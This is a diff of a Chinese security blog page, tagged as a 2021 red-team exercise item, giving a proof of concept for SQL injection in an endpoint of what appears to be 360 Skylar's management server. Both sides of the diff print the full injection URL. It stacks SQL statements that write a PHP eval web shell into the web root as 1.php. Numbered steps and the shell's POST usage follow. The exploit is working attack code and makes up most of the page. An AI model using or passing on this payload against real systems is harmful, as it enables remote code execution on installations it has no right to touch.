@@ -12,8 +12,7 @@
   <meta name="description" content="poc
 注入写shell:
 
-
-https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T TEXT);insert into O(T) value...">
+() https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T TEXT);insert into O(T) val...">
   <script src="https://p1and.github.io/media/prism.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
 </head>
@@ -91,10 +90,7 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T 
             <h2 id="poc">poc</h2>
 <pre><code>注入写shell:
 </code></pre>
-<!-- more -->
-<pre><code>https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('&lt;?php @eval($_POST[1]);?&gt;');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- 
-</code></pre>
-<!-- more -->
+<p>(<code>) https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1';create table O(T TEXT);insert into O(T) values('&lt;?php @eval($_POST[1]);?&gt;');copy O(T) to 'C:\Program Files (x86)\360\skylar6\www\1.php';drop table O;-- (</code>)</p>
 <p>利用过程:<br>
 1. 通过安装包安装的一般都有root权限，因此该注入点可尝试写shell<br>
 2. 通过注入点，创建一张表 O<br>
@@ -103,12 +99,7 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T 
 5. 删除 表O</p>
 <pre><code>shell地址:
 </code></pre>
-<!-- more -->
-<pre><code>    https://192.168.24.196:8443/1.php
-    POST
-        1=phpinfo();
-</code></pre>
-<!-- more -->
+<p>(<code>) https://192.168.24.196:8443/1.php POST 1=phpinfo(); (</code>)</p>
 <h2 id="漏洞演示">漏洞演示</h2>
 <figure data-type="image" tabindex="1"><img src="https://p1and.github.io/post-images/1623839390994.png" alt="" loading="lazy"></figure>
 <figure data-type="image" tabindex="2"><img src="https://p1and.github.io/post-images/1623839415860.png" alt="" loading="lazy"></figure>
@@ -136,6 +127,8 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T 
               <h4 class="text-base font-thin text-gray-700 mb-2">标签</h4>
               <div class="mb-6">
                 
+                  <a href="https://p1and.github.io/tag/sU4NsMlVQ/" class="py-1 px-4 border-gray-300 border text-sm inline-block text-gray-700 hover:text-gray-900 rounded mr-2 mb-2">2021HVV</a>
+                
               </div>
               <h4 class="text-base font-thin text-gray-700 mb-2">阅读时间</h4>
               <div class="text-lg mb-6">2 min read</div>
@@ -146,6 +139,8 @@ https://192.168.24.196:8443/api/dp/rptsvcsyncpoint?ccid=1&#39;;create table O(T 
   
 
   
+    
+      
     
   
 
